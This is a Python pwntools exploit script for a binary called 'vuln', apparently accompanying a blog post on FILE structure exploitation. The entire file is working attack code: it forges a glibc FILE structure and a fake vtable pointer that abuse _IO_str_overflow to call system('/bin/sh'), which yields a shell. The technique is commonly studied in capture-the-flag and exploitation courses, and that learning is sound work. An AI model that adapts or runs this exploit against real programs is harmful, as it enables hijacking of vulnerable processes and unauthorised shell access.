#!/usr/bin/python

"""
Exploit script for 'vuln'
https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/
"""

from pwn import *

# A handy function to craft FILE structures
def pack_file(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0):
    struct = p32(_flags) + \
             p32(0) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    struct = struct.ljust(0x88, "\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xd8, "\x00")
    return struct

def file_exploit_64(fake_file_addr, libc_path, libc_base):
    # Loading the libc
    libc = ELF(libc_path)

    # Our target
    rip = libc_base + libc.symbols['system']
    rdi = libc_base + next(libc.search("/bin/sh")) # The first param we want

    # We can only have even rdi
    assert(rdi%2 == 0)

    # Crafting FILE structure

    # This stores the address of a pointer to the _IO_str_overflow function
    # Libc specific
    io_str_overflow_ptr_addr = libc_base + libc.symbols['_IO_file_jumps'] + 0xd8
    # Calculate the vtable by subtracting appropriate offset
    fake_vtable_addr = io_str_overflow_ptr_addr - 2*8

    # Craft file struct
    file_struct = pack_file(_IO_buf_base = 0,
                            _IO_buf_end = (rdi-100)/2,
                            _IO_write_ptr = (rdi-100)/2,
                            _IO_write_base = 0,
                            _lock = fake_file_addr + 0x80)
    # vtable pointer
    file_struct += p64(fake_vtable_addr)
    # Next entry corresponds to: (*((_IO_strfile *) fp)->_s._allocate_buffer)
    file_struct += p64(rip)

    file_struct = file_struct.ljust(0x100, "\x00")
    
    return file_struct 
